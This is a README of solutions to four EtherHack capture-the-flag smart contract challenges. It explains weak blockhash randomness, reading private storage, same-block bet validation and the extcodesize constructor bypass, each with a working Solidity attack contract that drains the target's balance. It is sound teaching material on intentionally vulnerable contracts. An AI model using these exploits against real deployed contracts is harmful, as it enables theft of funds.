# EtherHack CTF Solutions
<center>
    <img src="https://etherhack.positive.com/imgs/etherhack.jpg" width="50%"/>
</center>
<br />

[EtherHack CTF](https://etherhack.positive.com/#/) solutions ⛳️

> NOTE: All challenges' smart contracts code are upgraded to v0.8.20. This does not affect at all the challenges behavior

### Useful commands for all challenges
```shell
forge compile: Compile smart contracts
forge test: Run tests for challenges solution
forge test -vvv: Run tests for challenges with tracers enabled (recommended for all challenges, to output the logs of the states before and after the exploit)
```
## Challenges 

[Azino 777](#01---azino777)
[Private Ryan](#02---private-ryan)
[Weel Of Fortune](#03---wheel-of-fortune)   
[Call me Maybe](#04---call-me-maybe)
   
## 01 - Azino777

To solve this challenge, we need to guess the correct input `bet` that should match a *generated random* value in order to take all the contract's balance:
```solidity
function spin(uint256 bet) public payable {
    require(msg.value >= 0.01 ether);
    uint256 num = rand(100);
    if(num == bet) {
        msg.sender.transfer(this.balance);
    }
}
```
This challenge shows the hardness of generating a **secure random number in smart contracts**. Someone checking the `rand` function implementation may think it generates a random number **while it does not**
```solidity
//Generate random number between 0 & max
  uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;
  function rand(uint max) constant private returns (uint256 result){
    uint256 factor = FACTOR * 100 / max;
    uint256 lastBlockNumber = block.number - 1;
    uint256 hashVal = uint256(block.blockhash(lastBlockNumber));

    return uint256((uint256(hashVal) / factor)) % max;
}
```
Statistically saying, we have a chance of 1% to guess the correct number on each try.<br/>
After inspecting the function logic, we notice that all the factors contributing to generating the *random* number are constants and pre-deterministic except for `hashVal` (which is the blockhash of the last block casted to uint256). So, if we get to know the value of the `hashVal` before the calculation starts, we could easily predict the *random number* by simply doing the same calculation in advance.<br />
For us to predict the true number, we can simply perform in **one transaction** the calculation of the *random number* using the same `rand` logic on our own and then, invoking the function `spin` passing the value we got by our calculation. And because both operations are in the same transaction, the `hashVal` will be the same for both calculations!! Hence, increasing the chances to get the correct number to **100%**!! <br />
Attack contract: 
```solidity
contract AzzinoHack {
    Azino777 public target;
    constructor(address payable _target) {
        target = Azino777(_target);
    }
    uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;
    function attack() payable external {
        // max is always passed as 100
        uint256 factor = FACTOR * 100 / 100;
        uint256 lastBlockNumber = block.number - 1;
        uint256 hashVal = uint256(blockhash(lastBlockNumber));

        uint bet =  uint256((uint256(hashVal) / factor)) % 100;
        target.spin{value: address(this).balance}(bet);
    }

    receive() external payable {}
}
```
[Attack contract](./src/Azino777.sol) | [Tests](./test/Azino777.t.sol)

## 02 - Private Ryan

This challenge follows the same logic as the previous one (so, we should follow the same exploit ;)). However, one factor is added to the calculation of the *random number*:
```solidity
uint256 blockNumber = block.number - seed;
```
If we check the `Private Ryan` contract, we will notice that `seed` is a private variable, initially initialized in the constructor:
```solidity
uint private seed = 1;

  constructor() {
    seed = rand(256);
  }
```
For us to determine the *random number*, we should get first the value of the private variable `seed`. <br />
This challenge shows the importance of **understanding the meaning of variable visibility modifier**. Variable visibility is set to `private` **does not mean that no one can read the value of it**, it means that **other contracts can not access it**. Anyone outside the blockchain can easily determine which `slot` the variable's value leave in, and then query the contract's storage layout to get the `slot` value.<br />
> If you don't know the storage layout and accessing private data, I suggest [reading my previous notes about it](https://github.com/Brivan-26/smart-contract-security/tree/master/Accessing-Private-Data)

It's obvious that the `seed` variable is taking the `slot 0`, so just before calculating the *random number*, we query the `slot 0 ` to get the `seed`'s value. E.g. using the Foundry framework
```solidity
bytes32 seed = vm.load(address(privateRyan), bytes32(uint256(0)));
hack.attack(uint256(seed));
```
[Hack contract](./src/PrivateRyan.sol) | [Tests](./test/PrivateRyan.t.sol)

> ***IMPORTANT NOTE***: when attempting to run the test, it may fail due to `arithmetic underflow`. That is because `block.number - seed` will generate a negative number because block.number initially is 1 when running the test, and the seed value is surely greater. Run the tests by setting the block number greater than 256. E.g: `forge test --match-path test/PrivateRyan.t.sol --block-number 500 -vvv`
# 03 - Wheel of Fortune

From a first look, this challenge looks like somehow we need to predict the hash of a future block:
```solidity
if (gameId > 0) {
    uint lastGameId = gameId - 1;
    uint num = rand(block.blockhash(games[lastGameId].blockNumber), 100);
    if(num == games[lastGameId].bet) {
        games[lastGameId].player.transfer(this.balance);
    }
}
```
We can see that with each player comes, he checks if the last player's bet is correct and if so, the last player will be rewarded... from here comes the challenge's hint *This lottery uses blockhash of a future block, try to beat it!*. <br />
However, the check we just spoke about is badly designed, and we can abuse it as follows: we know that the blockhash of the current block is always 0 (the block that contains our TX is not yet generated), so we can send two transactions in a row, and guess what... similar to the last challenge's idea, **they will be mined in the same block**. The first transaction is to set our bet, and the second is to validate our bet.
```solidity
function attack() external payable {
    require(msg.value >= 0.02 ether, "Not enough ether to perform attack");
    uint bet = uint256(keccak256(abi.encodePacked(blockhash(block.number)))) % 100;
    target.spin{value: 0.01 ether}(bet);
    target.spin{value: 0.01 ether}(bet);
}
```
Another approach to solve the challenge is by waiting for **256 blocks** after our bet transaction, that is because according to [Solidity documentation](https://docs.soliditylang.org/en/v0.8.20/units-and-global-variables.html#block-and-transaction-properties): `blockhash(uint blockNumber) returns (bytes32): hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero`. However, this approach is harder to follow, and it requires designing a bot to keep watching the network, we will stick with the first approach (the smartest :V). <br />
[Attack contract](./src/WheelOfFortune.sol) | [Tests](./test/WheelOfFortune.t.sol)

## 04 - Call Me Maybe

The solution of this challenge won't take more than 2 lines if we know a tricky thing (as always, smart contract vulnerabilities are all tricky).
By inspecing the contract's code, it seems that no one can call it:
```solidity
    modifier callMeMaybe() {
        uint32 size;
        address _addr = msg.sender;
        assembly {
            size := extcodesize(_addr)
        }
        if (size > 0) {
            revert();
        }
        _;
    }

    function HereIsMyNumber() external callMeMaybe {
        if (tx.origin == msg.sender) {
            revert();
        } else {
            payable(msg.sender).transfer(address(this).balance);
        }
    }
```
If we invoke the `HereIsmyNumber` function from an EOA, the check `tx.origin == msg.sender` will pass, so the transaction will revert while if we invoke it from a smart contract, the modifier `callmeMabye` will fail as well, so our transaction will revert in all cases.<br>
It seems that no smart contract can call this contract due to the EVM check using `extcodesize`. `extcodesize` returns the bytecode size of the `_addr` account. However, there is a bypass for that. At the moment when a newly deployed contract calls another contract in its constructor, the storage root is not yet initialized, it acts as a wallet only. Hence, it does not have associated code and `extcodesize` would yield zero.
```solidity
constructor(address payable _target) {
    CallMeMaybe(_target).HereIsMyNumber();
}
```
I told you we can solve it in two lines ;)
[Attack Contract](./src/CallMeMaybe.sol) | [Tests](./test/CallMeMaybe.t.sol)